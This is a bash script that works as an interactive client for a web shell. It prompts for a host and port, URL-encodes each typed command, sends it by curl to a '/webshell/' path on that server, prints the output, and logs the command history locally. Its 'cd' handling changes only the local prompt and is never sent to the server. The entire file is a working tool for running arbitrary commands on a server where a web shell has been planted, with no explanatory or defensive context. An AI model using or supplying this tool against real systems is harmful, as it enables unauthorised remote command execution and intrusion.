#!/usr/bin/env bash

# Prompt for host and port
read -p 'Host: ' host
read -p 'Port: ' port

# Initialize the current working directory
cwd=""

# Log file for command history
log_file="command_history.log"

while true; do
    # Prompt for the raw command
    read -p "$cwd$ " raw_command

    # Handle the cd command separately to update the current working directory
    if [[ "$raw_command" == cd* ]]; then
        new_dir=$(echo "$raw_command" | cut -d' ' -f2)
        if [[ -z "$new_dir" ]]; then
            cwd=""
        elif [[ "$new_dir" == /* ]]; then
            cwd="$new_dir"
        else
            cwd="$cwd/$new_dir"
        fi
        echo "Changed directory to $cwd"
        continue
    fi

    # URL encode the command
    command=$(printf "%s" "$raw_command" | jq -sRr @uri)

    # Send the request and capture the response
    response=$(curl -s "http://${host}:${port}/webshell/${command}")

    # Check if the response is valid
    if [[ -z "$response" ]]; then
        echo "Error: No response received"
    else
        echo "$response"
    fi

    # Log the command to the history file
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $raw_command" >> "$log_file"
done
